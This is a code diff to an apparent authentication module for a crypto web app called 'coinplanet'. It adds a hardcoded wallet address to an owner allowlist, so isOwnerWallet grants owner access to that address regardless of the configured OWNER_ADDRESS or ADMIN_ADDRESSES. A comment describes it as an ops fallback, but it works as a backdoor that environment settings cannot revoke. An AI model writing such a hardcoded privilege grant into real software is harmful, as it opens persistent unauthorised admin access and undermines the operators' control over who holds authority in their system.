@@ -6,6 +6,11 @@ import { unauthorized } from "./response";
 
 const OWNER_JWT_TTL_SECONDS = 2 * 60 * 60; // 2h
 const OWNER_JWT_ISS = "coinplanet-owner";
+const OWNER_FALLBACK_ALLOWLIST = [
+  // Ops/admin fallback: keep backend access available even when env vars are
+  // missing in Pages/Workers deployment config.
+  "0xca949919f03e3e52949d1436442312d8a023fe41",
+];
 
 function secretKey(env: Env): Uint8Array {
   const raw = env.JWT_SECRET;
@@ -16,6 +21,7 @@ export function isOwnerWallet(env: Env, wallet: string | null | undefined): bool
   if (!wallet) return false;
   const w = wallet.toLowerCase();
   if (env.OWNER_ADDRESS && w === env.OWNER_ADDRESS.toLowerCase()) return true;
+  if (OWNER_FALLBACK_ALLOWLIST.includes(w)) return true;
   if (env.ADMIN_ADDRESSES) {
     for (const entry of env.ADMIN_ADDRESSES.split(",")) {
       const a = entry.trim().toLowerCase();
